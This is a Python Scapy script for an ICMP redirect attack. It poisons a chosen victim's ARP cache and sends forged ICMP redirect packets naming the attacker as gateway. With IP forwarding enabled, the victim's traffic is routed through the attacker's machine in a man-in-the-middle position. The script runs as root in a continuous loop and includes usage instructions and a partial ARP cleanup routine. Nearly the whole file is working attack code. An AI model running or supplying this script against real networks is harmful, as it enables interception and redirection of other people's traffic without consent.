#!/usr/bin/python3
import scapy.all as scapy
import sys
import time
import logging
import os

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

class ICMPRedirectAttack:
    def __init__(self, interface, victim_ip):
        self.interface = interface
        self.victim_ip = victim_ip
        # Static IP configuration for direct connection
        self.attacker_ip = "192.168.1.2"  # Your Kali machine's static IP
        self.gateway_ip = self.attacker_ip  # In this case, attacker acts as gateway
        
        # Get MAC addresses
        self.victim_mac = self.get_mac(victim_ip)
        self.attacker_mac = self.get_if_mac(interface)
        self.gateway_mac = self.attacker_mac  # Same as attacker MAC
        
        logging.info(f"Attacker IP/Gateway: {self.attacker_ip}")
        logging.info(f"Attacker/Gateway MAC: {self.attacker_mac}")
        logging.info(f"Victim IP: {self.victim_ip}")
        logging.info(f"Victim MAC: {self.victim_mac}")
        
        # Basic network setup
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    def get_if_mac(self, iface):
        """Get interface MAC address"""
        try:
            return scapy.get_if_hwaddr(iface)
        except:
            return None

    def get_mac(self, ip):
        """Get MAC address for an IP"""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except:
            return None

    def send_redirect(self):
        """Send ICMP redirect packet"""
        try:
            ether = scapy.Ether(src=self.attacker_mac, dst=self.victim_mac)
            ip = scapy.IP(src=self.attacker_ip, dst=self.victim_ip)
            icmp = scapy.ICMP(type=5, code=1, gw=self.attacker_ip)
            redirect_packet = scapy.IP(src=self.victim_ip, dst="8.8.8.8")/scapy.TCP(sport=12345, dport=80)
            
            packet = ether/ip/icmp/redirect_packet
            scapy.sendp(packet, iface=self.interface, verbose=False)
            
        except Exception as e:
            logging.error(f"Error sending redirect: {e}")

    def arp_poison(self):
        """Simplified ARP poisoning for direct connection"""
        try:
            poison_victim = scapy.ARP(
                op=2,
                pdst=self.victim_ip,
                psrc=self.attacker_ip,
                hwdst=self.victim_mac
            )
            scapy.send(poison_victim, verbose=False)
            
        except Exception as e:
            logging.error(f"Error in ARP poisoning: {e}")

    def start(self):
        """Start the attack"""
        try:
            logging.info("Starting ICMP redirect attack...")
            
            while True:
                self.arp_poison()
                self.send_redirect()
                time.sleep(1)
                
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user")
        except Exception as e:
            logging.error(f"Attack failed: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup after attack"""
        logging.info("Cleaning up...")
        try:
            # Restore ARP table
            restore_victim = scapy.ARP(
                op=2,
                pdst=self.victim_ip,
                psrc=self.attacker_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                hwsrc=self.attacker_mac
            )
            scapy.send(restore_victim, count=5, verbose=False)
            
        except Exception as e:
            logging.error(f"Cleanup error: {e}")
        
        # Disable IP forwarding
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def main():
    if os.geteuid() != 0:
        logging.error("Please run as root")
        sys.exit(1)

    if len(sys.argv) < 5 or '-i' not in sys.argv or '-v' not in sys.argv:
        print(f"""
Usage: sudo python3 {sys.argv[0]} -i <interface> -v <victim_ip>
Example: sudo python3 {sys.argv[0]} -i eth0 -v 192.168.1.3
        """)
        sys.exit(1)

    try:
        interface_index = sys.argv.index('-i') + 1
        victim_index = sys.argv.index('-v') + 1
        
        interface = sys.argv[interface_index]
        victim_ip = sys.argv[victim_index]
        
        attack = ICMPRedirectAttack(interface, victim_ip)
        attack.start()
    except IndexError:
        print("Error: Missing argument values")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
